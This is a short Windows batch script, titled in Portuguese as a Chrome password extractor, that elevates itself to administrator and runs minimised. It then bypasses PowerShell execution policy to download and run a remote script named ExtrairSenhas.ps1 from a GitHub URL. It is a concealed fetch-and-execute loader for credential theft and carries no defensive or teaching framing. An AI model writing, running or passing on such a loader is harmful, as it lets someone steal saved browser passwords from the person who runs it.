@echo off
title Extrator de Senhas - Chrome

:: Verifica se está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Reinicia como administrador e já minimizado
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Minimized"
    exit
)

:: Executa o PowerShell minimizado
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Minimized -Command "Invoke-Expression (Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/espertin/wind/main/ExtrairSenhas.ps1')"

exit